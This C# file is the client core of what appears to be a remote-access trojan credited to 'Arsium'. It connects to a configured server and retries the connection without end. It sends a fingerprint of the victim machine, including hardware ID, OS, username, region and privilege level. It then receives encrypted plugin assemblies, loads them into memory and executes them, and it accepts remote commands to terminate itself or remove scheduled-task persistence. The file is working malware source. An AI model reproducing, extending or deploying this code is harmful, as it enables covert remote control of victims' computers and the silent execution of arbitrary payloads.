using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Client.Utils;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public class Client
    {
        public Socket S;
        public Host WorkingHost;
        public IPEndPoint ep;
        public string HWID { get; set; }

        public Client(Host H) 
        {
            this.HWID = HwidGen.HWID();
            this.WorkingHost = H;
            ep = new IPEndPoint(IPAddress.Parse(WorkingHost.host), WorkingHost.port);
            try
            {
                S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                S.ReceiveBufferSize = Shared.Utils.BufferSize;
                S.SendBufferSize = Shared.Utils.BufferSize;
                S.Connect(ep);
                if (S.Connected)
                {
                    Thread T = new Thread(() => ReadData());
                    T.Start();
                    SendID();
                }           
            }
            catch (Exception)
            {
                while (S.Connected == false)

                {
                    try
                    {
                        S.Connect(ep);
                        if (S.Connected)
                        {
                            Thread T = new Thread(() => ReadData());
                            T.Start();
                            SendID();
                            return;
                        }                      
                    }
                    catch{}

                    Thread.Sleep(1500);
                }
            }
        }
        private void SendID() 
        {
            Microsoft.VisualBasic.Devices.Computer I = new Microsoft.VisualBasic.Devices.Computer();
            List<string> DataToSend = new List<string>() {this.HWID, I.Info.OSFullName, Environment.UserName, I.Info.OSVersion, RegionInfo.CurrentRegion.Name + " - " + RegionInfo.CurrentRegion.EnglishName, Process.GetCurrentProcess().Handle.ToString(), Utils.Privilege(), Utils.Check64Bit() };
            Data DD = new Data();
            DD.Type = PacketTypes.PacketType.ID;
            DD.HWID = this.HWID;
            DD.DataReturn = new object[] { DataToSend };
            SendData(S, Encryption.RSMTool.RSMEncrypt(DD.Serialize(), Encoding.Unicode.GetBytes(Starting.Key)));
        }
        private void ReadData()
        {
            try
            {
                while (true)
                {
                    byte[] data = Encryption.RSMTool.RSMDecrypt(ReceiveData(S), Encoding.Unicode.GetBytes(Starting.Key));
                    if (data.Length > 0)
                    {
                        Data D = Shared.Serializer.Deserialize(data);
                        if (D.Type == PacketTypes.PacketType.CLOSE)
                        {
                            NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
                        }
                        else if (D.Type == PacketTypes.PacketType.UNINSTALL_TASKSCH) 
                        {
                            Utils.RemoveTaskScheduler();
                        }
                        else
                        {
                            Task.Run(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin));
                        }
                    }
                }
            }
            catch (Exception)
            {
                CheckConnection();       
            }
            Shared.Utils.ClearMem();
        }
        private async Task Launch(byte[] B, object[] Param ,  string IP)
        {
            try
            {
                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(B);
                System.Reflection.MethodInfo method = null;
                method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
                object obj = assemblytoload.CreateInstance(method.Name);
                await Task.Run(() => method.Invoke(obj, new object[] { WorkingHost, this.HWID, Param, this.S, Starting.Key, IP }));
            }
            catch{}
            finally 
            { 
                Shared.Utils.ClearMem();
            }
        }       
        private void CheckConnection()
        {
            while (true)
            {
                Thread.Sleep(1000);
                try
                {
                    S.Send(Shared.Utils.b, 0, 0);
                }
                catch (Exception)
                {

                    try
                    {
                        S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        S.ReceiveBufferSize = Shared.Utils.BufferSize;
                        S.SendBufferSize = Shared.Utils.BufferSize;
                        S.Connect(ep);

                        if (S.Connected == true)
                        {
                            Thread O = new Thread(() => ReadData());
                            O.Start();
                            SendID();
                            return;
                        }
                    }
                    catch{}
                }
            }
        }
        private byte[] ReceiveData(Socket S)
        {
            int total = 0;
            int recv;
            byte[] datasize = new byte[4];
            S.Poll(-1, SelectMode.SelectRead);
            recv = S.Receive(datasize, 0, 4, 0);
            int size = BitConverter.ToInt32(datasize, 0);
            int dataleft = size;
            byte[] data = new byte[size];
            while (total < size)
            {
                recv = S.Receive(data, total, dataleft, 0);
                total += recv;
                dataleft -= recv;
            }
            return data;
        }
    }
}
